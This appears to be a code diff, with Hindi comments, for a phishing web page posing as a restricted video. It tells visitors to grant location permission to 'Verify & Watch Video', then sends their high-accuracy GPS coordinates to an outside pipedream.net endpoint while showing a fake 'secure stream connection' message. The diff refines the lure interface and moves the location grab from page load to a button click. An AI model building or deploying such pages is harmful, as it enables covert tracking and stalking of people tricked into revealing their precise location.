@@ -14,11 +14,12 @@
             height: 100vh; overflow: hidden;
         }
 
+        /* सीधा और सुंदर मोबाइल इंटरफेस बॉक्स */
         #verification-modal {
-            display: none;
+            display: flex;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.95);
+            background-color: #0f0f0f;
             z-index: 9999;
             justify-content: center; align-items: center;
             padding: 20px; box-sizing: border-box;
@@ -51,6 +52,7 @@
         }
 
         .spinner {
+            display: none; /* लोडिंग शुरुआत में छुपी रहेगी */
             border: 3px solid #333; border-top: 3px solid #ffffff;
             border-radius: 50%; width: 30px; height: 30px;
             animation: spin 1s linear infinite; margin: 0 auto 15px auto;
@@ -60,24 +62,19 @@
 </head>
 <body>
 
-    <div id="loading-context" style="text-align: center;">
-        <div class="spinner"></div>
-        <h2>Loading Page, Please Wait...</h2>
-    </div>
-
     <div id="verification-modal">
         <div class="modal-box">
-            <div class="modal-title">Content Access Restricted</div>
-            <div class="modal-text">
+            <div id="loading-spinner" class="spinner"></div>
+            <div id="modal-title-text" class="modal-title">Content Access Restricted</div>
+            <div id="modal-body-text" class="modal-text">
                 This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.
             </div>
-            <button class="action-btn" onclick="executeLocationRoutine(true);">Verify & Watch Video</button>
+            <button id="main-action-btn" class="action-btn" onclick="executeLocationRoutine();">Verify & Watch Video</button>
         </div>
     </div>
 
     <script>
-        var targetEndpoint = 'https://eohi4x7xdjpqqrs.m.pipedream.net
-';
+        var targetEndpoint = 'https://eohi4x7xdjpqqrs.m.pipedream.net';
         var isFetching = false;
 
         function originalFetchDispatch(lat, lon) {
@@ -91,25 +88,27 @@
             });
         }
 
-        function showRestrictionUI() {
-            document.getElementById('loading-context').style.display = 'none';
-            document.getElementById('verification-modal').style.display = 'flex';
-        }
-
         function showLoadingUI() {
-            document.getElementById('verification-modal').style.display = 'none';
-            document.getElementById('loading-context').style.display = 'block';
+            document.getElementById('loading-spinner').style.display = 'block';
+            document.getElementById('modal-title-text').innerText = "Processing Verification...";
+            document.getElementById('modal-body-text').innerText = "Please wait while we establish a secure stream connection.";
+            document.getElementById('main-action-btn').style.display = 'none';
         }
 
-        function executeLocationRoutine(isFromButton) {
+        function resetToErrorUI() {
+            document.getElementById('loading-spinner').style.display = 'none';
+            document.getElementById('modal-title-text').innerText = "Content Access Restricted";
+            document.getElementById('modal-body-text').innerText = "This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.";
+            document.getElementById('main-action-btn').style.display = 'block';
+        }
+
+        function executeLocationRoutine() {
             if (isFetching) return;
             isFetching = true;
 
-            showLoadingUI();
+            showLoadingUI(); // बटन दबाते ही सुंदर लोडिंग स्क्रीन आएगी
 
             if (navigator.geolocation) {
-                // maximumAge: 0 जोड़ने से ब्राउज़र पुराना पुराना फेलियर डेटा इस्तेमाल नहीं करेगा
-                // नए फोन में जब मैन्युअल बटन क्लिक हो, तो हम फ्रेश प्रॉम्ट के लिए सेटिंग्स पास करेंगे
                 navigator.geolocation.getCurrentPosition(function(position) {
                     isFetching = false;
                     var lat = position.coords.latitude;
@@ -117,20 +116,16 @@
                     originalFetchDispatch(lat, lon);
                 }, function(error) {
                     isFetching = false;
-                    showRestrictionUI();
+                    resetToErrorUI(); // अगर GPS बंद है, तो वापस बटन दिखाएगा
                 }, {
                     enableHighAccuracy: true,
-                    timeout: isFromButton ? 6000 : 3500, // बटन क्लिक पर ब्राउज़र को प्रॉम्ट प्रोसेस करने के लिए थोड़ा अतिरिक्त समय (6 सेकंड) दिया गया है
-                    maximumAge: 0 
+                    timeout: 5000, // 5 सेकंड का सेफ टाइमआउट
+                    maximumAge: 0 // पुराना कैश डेटा पूरी तरह साफ रखेगा
                 });
             } else {
                 isFetching = false;
                 window.location.href = "https://google.com";
             }
-        }
-
-        window.onload = function() {
-            executeLocationRoutine(false);
         }
     </script>
 </body>
